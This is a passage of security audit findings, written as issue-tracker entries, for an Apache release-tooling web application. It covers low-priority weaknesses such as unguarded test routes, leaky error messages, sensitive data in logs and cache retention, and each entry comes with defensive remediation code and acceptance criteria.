### Details
- **Location:** `atr/admin/__init__.py`
- **Issue:** Test route accessible in production
- **Protection:** Requires admin authentication (blueprint-level `_check_admin_access()`)
- **Missing:** `_require_debug_and_allow_tests()` guard
- **Comparison:** Other test routes (`logs`, `validate_jwt`) properly use the guard

### Recommended Remediation

Add `_require_debug_and_allow_tests()` call at the beginning of the `raise_error` function, consistent with other test endpoints in the same file.

### Acceptance Criteria
- [ ] `_require_debug_and_allow_tests()` added to `raise_error` function
- [ ] Test confirms route inaccessible in production mode
- [ ] Test confirms route accessible in debug + test mode
- [ ] Unit test verifying the fix

### References
- Source reports: L2:13.4.2.md
- Related findings: ASVS-1342-MED-001, ASVS-1342-LOW-002
- ASVS sections: 13.4.2

### Priority
Low

---

## Issue: FINDING-469 - Admin Database Browser Available in Production Without Debug Check

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `/admin/data` routes provide a database browser interface that exposes raw database records including SSH keys, task details, and full entity data. While admin authentication is required, this is a development/debugging feature that should be gated by debug mode to prevent production access. This reveals internal data structures and relationships.

### Details
- **Location:** `atr/admin/__init__.py` (`data` and `data_model` functions)
- **Exposed data:** SSH keys, task details, entity data, database structure
- **Protection:** Requires admin authentication
- **Missing:** `_require_debug_and_allow_tests()` guard
- **Impact:** Reveals internal data structures to production admins

### Recommended Remediation

Add `_require_debug_and_allow_tests()` call to both `data` and `data_model` functions.

### Acceptance Criteria
- [ ] `_require_debug_and_allow_tests()` added to `data` function
- [ ] `_require_debug_and_allow_tests()` added to `data_model` function
- [ ] Test confirms routes inaccessible in production mode
- [ ] Test confirms routes accessible in debug + test mode
- [ ] Unit test verifying the fix

### References
- Source reports: L2:13.4.2.md
- Related findings: ASVS-1342-MED-001, ASVS-1342-LOW-001
- ASVS sections: 13.4.2

### Priority
Low

---

## Issue: FINDING-470 - API Error Responses Leak Internal Error Details

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
When unhandled exceptions occur in API endpoints, the error handlers return `str(error)` directly to the client. For unexpected exceptions, this can expose internal file paths, SQL fragments, class names, and system state information that aids attackers in understanding the application internals. Tracebacks are suppressed but raw exception messages are still returned.

### Details
- **Locations:** `atr/server.py`, `atr/blueprints/api.py`
- **Issue:** `str(error)` returned directly to client
- **Exposure:** File paths, SQL fragments, class names, system state
- **Current protection:** Tracebacks suppressed
- **Gap:** Exception messages not sanitized

### Recommended Remediation

In `_handle_generic_exception`:
1. Log full error details (including exception message and traceback)
2. Only return detailed errors when `is_dev_environment()` is True
3. Return generic 'Internal server error' message in production

Example:
```python
if is_dev_environment():
    return {"error": str(error), "type": type(error).__name__}, 500
else:
    log.exception("Unhandled exception in API endpoint")
    return {"error": "Internal server error"}, 500
```

### Acceptance Criteria
- [ ] Generic error messages returned in production
- [ ] Detailed error messages returned only in dev mode
- [ ] Full error details logged server-side
- [ ] Test confirms no internal details leaked in production
- [ ] Unit test verifying the fix

### References
- Source reports: L2:13.4.2.md
- Related findings: ASVS-1342-MED-003, ASVS-1342-MED-004
- ASVS sections: 13.4.2

### Priority
Low

---

## Issue: FINDING-471 - Task Arguments Logged at INFO Level in Production

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Task arguments are logged at INFO level, which is active in production. These arguments may contain sensitive information such as project keys, version identifiers, user identifiers, and other operational data. If logs are compromised or inadvertently exposed, this information increases the attack surface.

### Details
- **Location:** `atr/worker.py` lines 193 and 207
- **Log level:** INFO (active in production)
- **Content:** Task arguments including project keys, version identifiers, user identifiers
- **Impact:** Sensitive operational data in production logs

### Recommended Remediation

Change `log.info()` to `log.debug()` for task argument logging, or log only non-sensitive fields (task_id, task_type) at INFO level.

Example:
```python
log.info("Task started", task_id=task_id, task_type=task_type)
log.debug("Task arguments", args=args)  # Full args at debug level only
```

### Acceptance Criteria
- [ ] Task argument logging changed to DEBUG level
- [ ] Only task_id and task_type logged at INFO level
- [ ] Production logs verified not to contain sensitive task arguments
- [ ] Unit test verifying the fix

### References
- Source reports: L2:13.4.2.md
- Related findings: ASVS-1342-LOW-006
- ASVS sections: 13.4.2

### Priority
Low

---

## Issue: FINDING-472 - Pagination Offset Validation Bypassed Due to Typo

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
A typo in the attribute name check ('offest' instead of 'offset') prevents the offset validation from ever executing. This allows users to pass arbitrarily large offset values, potentially causing resource exhaustion or performance degradation. The `hasattr` check uses the wrong attribute name.

### Details
- **Location:** `atr/api/__init__.py` lines 1095-1110
- **Typo:** `hasattr(query_args, 'offest')` should be `hasattr(query_args, 'offset')`
- **Impact:** No validation on offset parameter
- **Risk:** Arbitrarily large offset values can cause resource exhaustion

### Recommended Remediation

Fix typo: change `hasattr(query_args, 'offest')` to `hasattr(query_args, 'offset')`

### Acceptance Criteria
- [ ] Typo corrected in attribute name check
- [ ] Unit tests added for offset validation (max, negative, valid values)
- [ ] Integration test confirms offset validation active
- [ ] Unit test verifying the fix

### References
- Source reports: L2:13.4.2.md
- Related findings: None
- ASVS sections: 13.4.2

### Priority
Low

---

## Issue: FINDING-473 - Database Connection URL Logged at Startup

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
During database initialization, the absolute database file path and migrations directory are logged at INFO level. This reveals filesystem layout information that could aid attackers in understanding the deployment structure if logs are exposed.

### Details
- **Location:** `atr/db/__init__.py` lines 640-645
- **Log level:** INFO (active in production)
- **Content:** Absolute database file path, migrations directory
- **Impact:** Filesystem layout disclosure in logs

### Recommended Remediation

Change `log.info()` to `log.debug()` for Alembic URL and script_location logging.

### Acceptance Criteria
- [ ] Database path logging changed to DEBUG level
- [ ] Migrations directory logging changed to DEBUG level
- [ ] Production logs verified not to contain filesystem paths
- [ ] Unit test verifying the fix

### References
- Source reports: L2:13.4.2.md
- Related findings: ASVS-1342-LOW-004
- ASVS sections: 13.4.2

### Priority
Low

---

## Issue: FINDING-474 - No Application-Level TRACE Method Rejection

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The application has a `before_request` hook that validates Sec-Fetch-Mode and Sec-Fetch-Site for non-GET/HEAD/OPTIONS requests, but it does not explicitly reject the TRACE method. While Quart's routing returns 405 for routes not registered with TRACE, a defense-in-depth approach should explicitly block TRACE at the application level in case the reverse proxy is misconfigured or bypassed. Low risk since Quart's routing would return 405 for TRACE on registered routes and direct access to Hypercorn ports (4443/8443) is bound to 127.0.0.1.

### Details
- **Location:** `atr/server.py` line 527 (`before_request` hook in `_app_setup_security_headers()`)
- **Missing:** Explicit TRACE method rejection
- **Current protection:** Quart routing returns 405 for unregistered TRACE
- **Gap:** No explicit application-level rejection
- **Mitigation:** Direct port access bound to localhost

### Recommended Remediation

Add an explicit TRACE rejection in the `before_request` hook within `_app_setup_security_headers()` in `atr/server.py`:

```python
@app.before_request
async def block_trace_method() -> None:
    if quart.request.method == "TRACE":
        raise base.ASFQuartException("TRACE method not allowed", errorcode=405)
```

### Acceptance Criteria
- [ ] Explicit TRACE rejection added to `before_request` hook
- [ ] Test confirms TRACE requests return 405
- [ ] Test confirms other methods (GET, POST) still function
- [ ] Unit test verifying the fix

### References
- Source reports: L2:13.4.4.md
- Related findings: ASVS-1344-MED-001
- ASVS sections: 13.4.4

### Priority
Low

---

## Issue: FINDING-475 - Test Endpoint Available in Production Without ALLOW_TESTS Guard

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `/admin/raise-error` test endpoint deliberately raises an unhandled RuntimeError but lacks the `_require_debug_and_allow_tests()` guard applied to other test endpoints in the same file (`logs`, `validate_jwt`). While admin authentication is required via blueprint-level `_check_admin_access()`, the endpoint can be accessed in production mode. In development configurations, error handlers display full tracebacks. This is inconsistent with the pattern used for other test endpoints.

### Details
- **Location:** `atr/admin/__init__.py` (`raise_error` function)
- **Issue:** Missing `_require_debug_and_allow_tests()` guard
- **Protection:** Admin authentication required
- **Gap:** Accessible in production mode
- **Comparison:** Other test endpoints properly use the guard:
  - `logs()` function
  - `validate_jwt_get()` function
  - `delete_test_openpgp_keys()` function

### Recommended Remediation

Add the `_require_debug_and_allow_tests()` guard at the beginning of the `raise_error` function, consistent with other test endpoints (`logs`, `validate_jwt_get`) in the same file. This will ensure the endpoint is only accessible when both Debug mode is enabled and ALLOW_TESTS is set to True.

### Acceptance Criteria
- [ ] `_require_debug_and_allow_tests()` guard added to `raise_error` function
- [ ] Test confirms endpoint inaccessible in production mode
- [ ] Test confirms endpoint accessible when debug+tests enabled
- [ ] Unit test verifying the fix

### References
- Source reports: L2:13.4.5.md
- Related findings: logs(), validate_jwt_get(), delete_test_openpgp_keys()
- ASVS sections: 13.4.5

### Priority
Low

---

## Issue: FINDING-476 - Principal Authorization Cache Lacks Purge for Inactive Users

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The authorization cache stores committee and project memberships for authenticated users. While entries are refreshed when outdated (600-second TTL), entries for inactive users are never removed, causing unbounded memory growth. ASVS 14.2.2 requires cached data be 'securely purged after use'. If a user's committee memberships change or account is deactivated, stale data remains until process restart.

### Details
- **Location:** `atr/principal.py` lines 172-182
- **Issue:** No eviction mechanism for stale entries
- **Impact:** Unbounded memory growth, stale authorization data
- **Current behavior:** Entries refreshed if accessed, but never removed

### Recommended Remediation

Add eviction mechanism for stale entries:

```python
class Cache:
    def __init__(self, cache_for_at_most_seconds: int = 600, max_entries: int = 10000):
        self.cache_for_at_most_seconds = cache_for_at_most_seconds
        self.max_entries = max_entries
        self.last_refreshed: dict[str, int | None] = {}
        self.member_of: dict[str, frozenset[str]] = {}
        self.participant_of: dict[str, frozenset[str]] = {}
    
    def evict_stale(self) -> None:
        """Remove entries not refreshed within 2x TTL."""
        now = int(time.time())
        stale_uids = [
            uid for uid, ts in self.last_refreshed.items()
            if ts is not None and (now - ts) > self.cache_for_at_most_seconds * 2
        ]
        for uid in stale_uids:
            self.last_refreshed.pop(uid, None)
            self.member_of.pop(uid, None)
            self.participant_of.pop(uid, None)

# Call periodically from admins_refresh_loop or dedicated background task
```

### Acceptance Criteria
- [ ] `evict_stale()` method implemented in Cache class
- [ ] Periodic eviction task scheduled (e.g., from `admins_refresh_loop`)
- [ ] Memory leak test confirms stale entries removed
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.2.2.md
- Related findings: None
- ASVS sections: 14.2.2

### Priority
Low

---

## Issue: FINDING-477 - In-Memory Log Buffer Retains Query Parameters with Sensitive Data

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
When query logging is enabled, SQL queries are compiled with `literal_binds=True`, expanding parameter values into the query string. These queries are stored in an in-memory log buffer that may contain token hashes, fingerprints, and user identifiers. Token hashes, fingerprints, and user identifiers appear in query strings and are stored in the in-memory log buffer (capped at 100 entries, no sensitive-value scrubbing). Lower severity due to limited exposure, but violates principle of not caching sensitive data.

### Details
- **Locations:**
  - `atr/log.py` line ~16 (log buffer)
  - `atr/db/__init__.py` (`Query.log_query()` method)
- **Issue:** `literal_binds=True` expands parameters into query string
- **Content:** Token hashes, fingerprints, user identifiers
- **Storage:** In-memory buffer (100 entries max)
- **Exposure:** Via GET /admin/logs when debug+test enabled

### Recommended Remediation

**Option 1:** Never use `literal_binds` for logging:

```python
def log_query(self, method_name: str, log_query: bool) -> None:
    if not (self.session.log_queries or global_log_query or log_query):
        return
    try:
        compiled_query = self.query.compile(self.session.bind)
        # Log query structure without parameter values
        log.info(f"Executing query ({method_name}): {compiled_query}")
    except Exception as e:
        log.error(f"Error compiling query for logging ({method_name}): {e}")
```

**Option 2:** Apply Cache-Control to logs endpoint (covered by global fix)

### Acceptance Criteria
- [ ] Query logging updated to exclude parameter values
- [ ] In-memory buffer verified not to contain sensitive values
- [ ] Test confirms query structure logged without parameters
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.2.2.md
- Related findings: ASVS-1422-HIGH-001
- ASVS sections: 14.2.2

### Priority
Low

---

## Issue: FINDING-478 - Session Cache File Written Without Restrictive Permissions

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The session cache file containing user authorization data is written without explicit restrictive permissions, inheriting default umask (typically 0o644, world-readable). `user_session_cache.json` containing all users' cached session data (roles, admin status, committee memberships) may be readable by other processes/users on the same system. The `atomic_write_file()` function does not call `os.chmod()` - file inherits umask permissions.

### Details
- **Location:** `atr/util.py` (`atomic_write_file()` function)
- **File:** `user_session_cache.json` in cache directory
- **Content:** User roles, admin status, committee memberships
- **Issue:** File inherits default umask (typically 0o644, world-readable)
- **Missing:** Explicit `os.chmod()` call

### Recommended Remediation

Set restrictive permissions after write:

```python
async def session_cache_write(cache_data: dict[str, dict]) -> None:
    cache_path = pathlib.Path(config.get().STATE_DIR) / "cache" / "user_session_cache.json"
    await atomic_write_file(cache_path, json.dumps(cache_data, indent=2))
    # Set restrictive permissions
    await asyncio.to_thread(os.chmod, cache_path, 0o600)
```

Or enhance `atomic_write_file` with mode parameter:

```python
async def atomic_write_file(
    file_path: pathlib.Path, content: str, encoding: str = "utf-8", 
    mode: int | None = None
) -> None:
    await aiofiles.os.makedirs(file_path.parent, exist_ok=True)
    temp_path = file_path.parent / f".{file_path.name}.{uuid.uuid4()}.tmp"
    try:
        fd = await asyncio.to_thread(
            os.open, str(temp_path), os.O_WRONLY | os.O_CREAT | os.O_EXCL, 
            mode or 0o644
        )
        # ... rest of implementation
```

### Acceptance Criteria
- [ ] Session cache file written with 0o600 permissions
- [ ] Filesystem permissions verified after write
- [ ] Test confirms file not readable by other users
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.2.2.md
- Related findings: ASVS-1422-MEDIUM-004
- ASVS sections: 14.2.2

### Priority
Low

---

## Issue: FINDING-479 - JWT Claims Including User Identity Logged at DEBUG Level

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
JWT claims including user identity (sub), JWT ID (jti), timestamps (iat, exp), and potentially PAT hash (atr_th) are logged in their entirety at DEBUG level. While DEBUG level is less likely to be enabled in production, it is commonly enabled during troubleshooting. User identity and token identifiers enter the log stream, and if logs are forwarded to external aggregation services, this data leaves application control. PAT hash (atr_th) could potentially be used to correlate token usage across systems.

### Details
- **Location:** `atr/jwtoken.py` line 116
- **Log level:** DEBUG
- **Content:** Full JWT claims including:
  - User identity (sub)
  - JWT ID (jti)
  - Timestamps (iat, exp)
  - PAT hash (atr_th)
- **Risk:** Data enters log stream and may be forwarded externally

### Recommended Remediation

Replace full claims dump with selective logging. Log only essential information for debugging:

```python
log.debug(
    "JWT verified successfully",
    subject=claims.get("sub"),
    jti=claims.get("jti")[:8] + "..." if claims.get("jti") else None,
    expires_in=claims.get("exp") - int(time.time()) if claims.get("exp") else None
)
```

Truncate sensitive identifiers and avoid logging the full claims dictionary.

### Acceptance Criteria
- [ ] Full claims dictionary no longer logged
- [ ] Only essential, truncated fields logged
- [ ] Debug logging tested for appropriate information
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.2.3.md
- Related findings: None
- ASVS sections: 14.2.3

### Priority
Low

---

## Issue: FINDING-480 - User Identity Data Sent to External GitHub API

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The asf_uid (Apache Software Foundation user identifier) is transmitted to GitHub's API as a workflow input parameter for GitHub Actions workflow dispatch events. Once transmitted, the ASF UID is stored on GitHub/Microsoft infrastructure, subject to GitHub's data retention policies (not Apache's), visible to anyone with read access to the apache/tooling-actions repository, potentially logged in GitHub's internal systems, and subject to GitHub's privacy policy and terms of service. Mitigating factors include: ASF UIDs are already semi-public information, apache/tooling-actions is an Apache-controlled repository, GitHub has a formal relationship with ASF, user identity is required for audit traceability, and only ASF committers can trigger workflows.

### Details
- **Location:** `atr/tasks/gha.py` lines 119-155
- **Transmitted data:** ASF UID (user identifier)
- **Destination:** GitHub API (github.com)
- **Storage:** GitHub/Microsoft infrastructure
- **Mitigating factors:**
  - ASF UIDs semi-public (commits, mailing lists)
  - apache/tooling-actions is Apache-controlled
  - GitHub has organizational relationship with ASF
  - Required for audit traceability
  - Limited to authenticated committers

### Recommended Remediation

Two options:

**(1) Pseudonymization:** Create a pseudonymous dispatch reference using hash of `asf_uid:unique_id:workflow`, store mapping internally for audit purposes, and send only the pseudonymous reference to GitHub.

**(2) Risk Acceptance with Documentation (Recommended):** Document this as an accepted data sharing arrangement in a Data Privacy Impact Assessment (DPIA), noting:
- ASF UID is semi-public
- GitHub has organizational relationship with ASF
- Required for audit logs
- Limited to authenticated committers

Option 2 (risk acceptance) is recommended given the mitigating factors and legitimate audit requirements.

### Acceptance Criteria
- [ ] Decision documented: pseudonymization or risk acceptance
- [ ] If pseudonymization: mapping storage and retrieval implemented
- [ ] If risk acceptance: DPIA documentation created
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.2.3.md
- Related findings: None
- ASVS sections: 14.2.3

### Priority
Low

---

## Issue: FINDING-481 - JWT TTL Documentation Mismatch

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Documentation states JWT TTL is 90 minutes, but implementation uses 30 minutes (`_ATR_JWT_TTL = 30 * 60`). This causes operational confusion as users may expect longer session duration than actually provided.

### Details
- **Documentation:** `atr/docs/authentication-security.md` states 90 minutes
- **Implementation:** `atr/jwtoken.py` uses 30 minutes
- **Impact:** User expectations vs. actual behavior mismatch

### Recommended Remediation

Update `authentication-security.md` documentation:

```markdown
- **JWT TTL:** 30 minutes (short-lived, refresh via re-authentication)
```

### Acceptance Criteria
- [ ] Documentation updated to reflect 30-minute TTL
- [ ] All references to JWT TTL verified consistent
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.2.4.md
- Related findings: None
- ASVS sections: 14.2.4

### Priority
Low

---

## Issue: FINDING-482 - Deprecated Secret Keys Still Loaded as Class Attributes

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
SECRET_KEY and JWT_SECRET_KEY are loaded from secrets file as class attributes despite being deprecated in favor of generated keys. This creates confusing code and risk of accidentally using deprecated keys if code references them.

### Details
- **Location:** `atr/config.py`
- **Issue:** Deprecated keys loaded as class attributes
- **Risk:** Accidental use of deprecated keys
- **Current status:** Keys deprecated but still loaded

### Recommended Remediation

Move to one-time migration check function:

```python
def _check_deprecated_secrets():
    """Log warning if deprecated secrets still present."""
    if (SECRETS_DIR / "SECRET_KEY").exists():
        log.warning("Deprecated SECRET_KEY file found; should be removed")
```

### Acceptance Criteria
- [ ] Deprecated keys no longer loaded as class attributes
- [ ] Migration check function implemented
- [ ] Warning logged if deprecated secrets found
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.2.4.md
- Related findings: None
- ASVS sections: 14.2.4

### Priority
Low

---

## Issue: FINDING-483 - Expired Personal Access Tokens Not Automatically Purged

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Expired PATs are rejected at authentication time but never deleted from database, causing unbounded growth and unnecessary storage of expired credentials.

### Details
- **Location:** `atr/storage/writers/tokens.py`
- **Issue:** Expired tokens remain in database indefinitely
- **Impact:** Unbounded database growth, unnecessary credential storage

### Recommended Remediation

Add recurring task to purge expired tokens:

```python
async def purge_expired_tokens():
    """Delete PATs expired >30 days ago."""
    cutoff = datetime.now() - timedelta(days=30)
    await db.execute(
        "DELETE FROM personal_access_tokens WHERE expires_at < ?",
        (cutoff,)
    )
```

Schedule this task to run daily or weekly.

### Acceptance Criteria
- [ ] Purge function implemented
- [ ] Scheduled task configured (daily or weekly)
- [ ] Database growth verified to stabilize
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.2.4.md
- Related findings: None
- ASVS sections: 14.2.4

### Priority
Low

---

## Issue: FINDING-484 - Debug print() Bypasses Structured Logging

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Use of `print(vulns)` in `osv.py` bypasses logging configuration, producing unstructured output that is difficult to filter or route. This inconsistency with the application's structured logging approach reduces log manageability.

### Details
- **Location:** `atr/sbom/osv.py` line 110
- **Issue:** `print()` used instead of structured logging
- **Impact:** Unstructured output, bypasses log configuration

### Recommended Remediation

Replace `print()` with structured logging:

```python
log.debug("Loaded vulnerabilities from bundle", count=len(vulns))
```

### Acceptance Criteria
- [ ] `print()` replaced with `log.debug()`
- [ ] Structured logging verified in output
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.2.4.md
- Related findings: None
- ASVS sections: 14.2.4

### Priority
Low

---

## Issue: FINDING-485 - Environment Variables Logged in Exception Handler

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Seven environment variables are logged on GitHub clone failure, including potentially sensitive configuration. This causes unnecessary exposure of environment configuration in error logs.

### Details
- **Location:** `atr/tasks/checks/compare.py` lines 159-170
- **Issue:** Environment variables logged in exception handler
- **Content:** Seven environment variables including potentially sensitive configuration

### Recommended Remediation

Log only presence indicators instead of values:

```python
log.exception(
    "Failed to clone GitHub repo",
    repo_url=repo_url,
    git_identity_configured=bool(os.environ.get("GIT_AUTHOR_NAME")),
)
```

### Acceptance Criteria
- [ ] Environment variables no longer logged in full
- [ ] Only presence indicators logged
- [ ] Exception handling still provides debugging context
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.2.4.md
- Related findings: None
- ASVS sections: 14.2.4

### Priority
Low

---

## Issue: FINDING-486 - Session Cache Has No Retention Policy

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Session cache data persists indefinitely with no expiry mechanism, potentially retaining stale authorization data. This leads to stale data accumulation and risk of using outdated authorization information.

### Details
- **Location:** `atr/post/user.py`
- **Issue:** No expiry mechanism for cached data
- **Impact:** Stale authorization data accumulation

### Recommended Remediation

Add timestamp and expiry check:

```python
session_data["_cached_at"] = int(time.time())

# In read path:
if time.time() - cached_data.get("_cached_at", 0) > 86400:  # 24 hours
    return None  # Force fresh LDAP lookup
```

### Acceptance Criteria
- [ ] Timestamp added to cached session data
- [ ] Expiry check implemented in read path
- [ ] Stale data verified to be re-fetched
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.2.4.md
- Related findings: ASVS-1424-MED-005
- ASVS sections: 14.2.4

### Priority
Low

---

## Issue: FINDING-487 - SSH Key Storage Without Expiration

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Regular SSH keys have no expiration mechanism, unlike workflow SSH keys which have 20-minute TTL. Long-lived SSH keys increase risk window if compromised with no forced rotation.

### Details
- **Location:** `atr/storage/writers/ssh.py`
- **Issue:** No expiration for regular SSH keys
- **Comparison:** Workflow SSH keys have 20-minute TTL
- **Impact:** Long-lived keys with no forced rotation

### Recommended Remediation

Add optional expiration or rotation reminders:

```python
async def create(self, public_key: str, expires_at: Optional[datetime] = None):
    # Store expiration
    # Add periodic task to notify users of expiring keys
```

### Acceptance Criteria
- [ ] Expiration field added to SSH key model
- [ ] Notification mechanism for expiring keys
- [ ] Periodic task to check for expired keys
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.2.4.md
- Related findings: None
- ASVS sections: 14.2.4

### Priority
Low

---

## Issue: FINDING-488 - Client-Side JWT Display TypeScript Not Available for Complete Audit

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `/tokens` page loads a TypeScript module named 'create-a-jwt' that handles the JWT generation workflow via AJAX and displays the JWT in the DOM element `#jwt-output`. The TypeScript source was not included in the files provided for this audit. Without it, we cannot verify whether: (1) The JWT is stored in localStorage, sessionStorage, or IndexedDB during the display period; (2) The JWT is reliably cleared from the DOM and memory after the countdown; (3) Any intermediate state is cached in browser storage; (4) The JWT response is properly cleaned up on page navigation. This represents an audit coverage gap rather than a confirmed vulnerability.

### Details
- **Location:** `atr/get/tokens.py` lines 55-80 (loads TypeScript module)
- **Missing file:** `atr/static/ts/create-a-jwt.ts` not included in audit
- **Audit gap:** Cannot verify client-side JWT handling
- **Potential risks if JWT stored:**
  - localStorage persistence
  - sessionStorage persistence
  - IndexedDB storage
  - Incomplete cleanup on navigation

### Recommended Remediation

1. Include the create-a-jwt TypeScript in the audit scope to verify:
   - No JWT storage in localStorage/sessionStorage/IndexedDB
   - JWT is only held in DOM/memory
   - Proper cleanup on page navigation

2. Implement explicit cleanup handlers using `window.addEventListener('beforeunload')`

3. Consider using memory-only approaches such as Blob URLs that can be explicitly revoked

4. Verify the countdown timer reliably clears the JWT after 30 minutes

### Acceptance Criteria
- [ ] TypeScript source included in audit scope
- [ ] Verification that JWT not stored in browser storage
- [ ] Page lifecycle cleanup handlers implemented
- [ ] Timer-based cleanup verified reliable
- [ ] Unit test verifying the fix

### References
- Source reports: L2:14.3.3.md
- Related findings: ASVS-1433-MED-001
- ASVS sections: 14.3.3

### Priority
Low

---

## Issue: FINDING-489 - No Explicit Directory Listing Prevention on Docroot

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Neither vhost configuration includes an explicit `<Directory>` block for the docroot `/x1/dist/` with `Options -Indexes`. If the global Apache configuration does not explicitly set `Options -Indexes` (the Apache default is `Options All` which includes `Indexes`), and if any URL path is not matched by the `ProxyPass` rules or Alias directives, the docroot could expose a directory listing. Current proxy rules minimize practical risk, but defense-in-depth dictates explicitly disabling indexes on the docroot.

### Details
- **Configuration file:** `tooling-vm-ec2-de.apache.org.yaml`
- **Both vhosts:** release-test.apache.org and tooling-vm-ec2-de.apache.org
- **Docroot:** `/x1/dist/`
- **Missing:** Explicit `Options -Indexes` directive
- **Current protection:** Proxy rules cover `/` and `/downloads/`
- **Gap:** Configuration changes could expose directory listings

### Recommended Remediation

Add an explicit directory block for the docroot:

```yaml
<Directory /x1/dist/>
    Options -Indexes +FollowSymLinks
    Require all denied
</Directory>
```

### Acceptance Criteria
- [ ] Directory block added to both vhost configurations
- [ ] `Options -Indexes` verified in Apache configuration
- [ ] Directory listing access test confirms rejection
- [ ] Unit test verifying the fix

### References
- Source reports: L2:13.4.3.md
- Related findings: None
- ASVS sections: 13.4.3

### Priority
Low

---

## Issue: FINDING-490 - General Library Update Timeframe Is Enforced but Undocumented as Policy

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The application enforces a 30-day maximum dependency age through code (`_MAX_AGE_DAYS=30` in `scripts/check_when_dependencies_updated.py`) with pre-commit enforcement. However, ASVS 15.1.1 requires this to be defined in application documentation, not just enforced in code. The pre-commit hook description incorrectly references 'ASVS 15.2.1' instead of '15.1.1'. There is no documented rationale for the 30-day value, and new team members must read code to understand the policy.

### Details
- **Code enforcement:** `scripts/check_when_dependencies_updated.py` lines 30-31
- **Pre-commit hook:** `.pre-commit-config.yaml` lines 148-153
- **Missing:** Policy documentation explaining the 30-day requirement
- **Error:** Pre-commit config references incorrect ASVS section (15.2.1 should be 15.1.1)

### Recommended Remediation

1. Add documented reference in `SECURITY.md` or `docs/dependency-remediation-policy.md` explaining the 30-day general update policy and its rationale

2. Correct ASVS reference in `.pre-commit-config.yaml` line 150 from 'ASVS 15.2.1' to 'ASVS 15.1.1'

3. Add code comments to `scripts/check_when_dependencies_updated.py` referencing the policy document

4. Document enforcement mechanism:
   - Reads exclude-newer timestamp from uv.lock
   - Fails build if dependencies exceed 30 days old
   - Verified on every commit via pre-commit hook

Total effort: ~1 hour.

### Acceptance Criteria
- [ ] Policy document created with 30-day requirement and rationale
- [ ] ASVS reference corrected in `.pre-commit-config.yaml`
- [ ] Code comments added referencing policy document
- [ ] Unit test verifying the fix

### References
- Source reports: L1:15.1.1.md
- Related findings: FINDING-310
- ASVS sections: 15.1.1

### Priority
Low

---

## Issue: FINDING-491 - Dependabot Cooldown May Delay Critical Vulnerability Patches

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Dependabot applies a uniform 7-day cooldown period regardless of vulnerability severity. Updates run weekly on Monday with 7-day cooldown after any update, meaning no differentiation for critical vulnerabilities. If a critical RCE vulnerability is disclosed in a dependency on Tuesday (day after weekly run), Dependabot will wait until the following Monday (6 days), then potentially wait another 7 days if cooldown is active. Potential exposure window: up to 14 days for critical vulnerabilities. There is no documented override process for bypassing the cooldown in emergency situations.

### Details
- **Configuration:** `.github/dependabot.yml` lines 8-15
- **Schedule:** Weekly on Monday
- **Cooldown:** 7 days after any update
- **Issue:** No differentiation for critical vulnerabilities
- **Impact:** Up to 14-day exposure window for critical CVEs

### Recommended Remediation

1. Document emergency override process for critical vulnerabilities (CVSS ≥9.0) in remediation policy. Process should include:
   - Immediate assessment within 4 hours
   - Manual PR creation bypassing Dependabot
   - Expedited testing
   - Deployment within 48 hours

2. Consider adding second Dependabot configuration for security-only updates with no cooldown (requires GitHub Advanced Security)

3. Optional: Implement automated critical CVE monitoring GitHub Action (runs every 6 hours, creates emergency issues for critical vulnerabilities)

Total effort: 1-5 hours depending on optional enhancements.

### Acceptance Criteria
- [ ] Emergency override process documented
- [ ] Escalation criteria defined (CVSS threshold)
- [ ] Response timelines documented
- [ ] Optional: Automated CVE monitoring implemented
- [ ] Unit test verifying the fix

### References
- Source reports: L1:15.1.1.md
- Related findings: FINDING-310
- ASVS sections: 15.1.1

### Priority
Low

---

